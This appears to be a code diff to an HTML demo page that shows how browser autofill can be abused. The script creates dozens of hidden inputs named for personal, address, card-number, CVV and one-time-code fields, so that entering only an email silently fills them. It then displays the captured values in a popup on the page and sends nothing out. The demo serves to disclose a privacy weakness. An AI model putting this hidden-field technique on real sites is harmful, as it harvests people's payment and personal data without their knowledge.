@@ -10,43 +10,37 @@
     <p class="label">This is a demo of how browser autofill can be exploited to get far more personal data from someone than expected.</p>
     <main>
         <p>Enter your email.</p>
-        <form>
+        <form id="form">
             <input name="email" id="email" autocomplete="on" type="email" spellcheck="false" placeholder="example@mail.com">
-            <input name="username" id="username" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="name" id="name" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="full-name" id="full-name" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="first-name" id="first-name" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="last-name" id="last-name" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="surname" id="surname" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="family-name" id="family-name" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="birth-date" id="birth-date" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="date-of-birth" id="date-of-birth" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="phone" id="phone" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="phone-number" id="phone-number" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="number" id="number" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="address" id="address" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="postcode" id="postcode" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="street" id="street" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="state" id="state" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="city" id="city" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="town" id="town" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="province" id="province" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="country" id="country" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="initials" id="initials" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="address-line-2" id="address-line-2" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="card-number" id="card-number" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="cvv" id="cvv" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="expiry-date" id="expiry-date" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="one-time-code" id="one-time-code" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="company" id="company" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="organisation" id="organisation" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="organization" id="organization" autocomplete="on" type="text" spellcheck="false" class="hidden">
-            <input name="timezone" id="timezone" autocomplete="on" type="text" spellcheck="false" class="hidden">
         </form>
         <button id="submit">Submit</button>
         <div id="popup"></div>
     </main>
     <script>
+        const form = document.getElementById("form");
+
+        // https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#autofilling-form-controls:-the-autocomplete-attribute
+        // https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/autocomplete
+        const autocompletes = [
+            "name", "honorific-prefix", "given-name", "additional-name", "family-name", "honorific-suffix", "nickname", "username", "new-password", "current-password", "one-time-code", "organization-title", "organization", "street-address", "address-line1", "address-line2", "address-line3", "address-level4", "address-level3", "address-level2", "address-level1", "country", "country-name", "postal-code", "cc-name", "cc-given-name", "cc-additional-name", "cc-family-name", "cc-number", "cc-exp", "cc-exp-month", "cc-exp-year", "cc-csc", "cc-type", "transaction-currency", "transaction-amount", "language", "bday", "bday-day", "bday-month", "bday-year", "sex", "url", "photo", "home", "work", "mobile", "fax", "pager", "tel", "tel-country-code", "tel-national", "tel-area-code", "tel-local", "tel-local-prefix", "tel-local-suffix", "tel-extension", /*"email",*/ "impp"
+        ];
+        const extras = [
+            "full-name", "first-name", "last-name", "surname", "birth-date", "date-of-birth", "phone", "phone-number", "number", "address", "postcode", "state", "city", "town", "province", "initials", "address-line-2", "card-number", "cvv", "expiry-date", "company", "timezone", "page", "shipping", "billing"
+        ];
+        const values = [...extras, ...autocompletes];
+
+        for (const value of values) {
+            const input = document.createElement("input");
+            input.type = "text";
+            input.spellcheck = "false";
+            input.className = "hidden";
+            input.name = value;
+            input.id = value;
+            input.autocomplete = "on";
+
+            form.appendChild(input);
+        }
+
         const inputs = document.querySelectorAll("input");
         const submit = document.getElementById("submit");
         const popup = document.getElementById("popup");
@@ -59,6 +53,7 @@
                 if (input.value != "") {
                     data += `<span>${input.name.replaceAll("-", " ").replace(input.name.charAt(0), input.name.charAt(0).toUpperCase())}:</span><span>${input.value}</span>`;
                 }
+                input.value = "";
             });
 
             popup.innerHTML = data;
